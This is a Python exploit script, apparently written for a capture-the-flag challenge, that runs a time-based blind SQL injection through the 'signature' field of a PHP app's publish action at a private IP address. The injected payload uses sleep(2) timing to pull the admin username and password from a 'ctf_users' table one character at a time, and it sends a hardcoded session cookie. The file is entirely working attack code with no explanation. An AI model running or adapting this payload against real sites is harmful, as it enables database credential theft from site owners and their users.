# !/usr/bin/env python3
# -*- coding: utf-8 -*-

# built-in import
import time

# third-party import
import requests

cookie = {
    'PHPSESSID': '2nn8dmeesl4mpv9odkf9bl4370'
}

secret = ''
for i in range(1, 48):
    for j in range(33, 127):
        url = 'http://192.168.200.129/index.php?action=publish'
        payload = f"a`,if(ascii(substr((select group_concat(username,0x2c,password) from ctf_users where is_admin<>0 limit 0,1),{i},1))={j},sleep(2),0))#"
        data = {
            "signature": payload,
            "mood": '1'
        }
        start_time = time.time()
        r = requests.post(url, data=data, cookies=cookie)
        if time.time() - start_time > 2:
            secret += chr(j)
            print(f"\033[32m[*] {secret}\033[0m")
            break
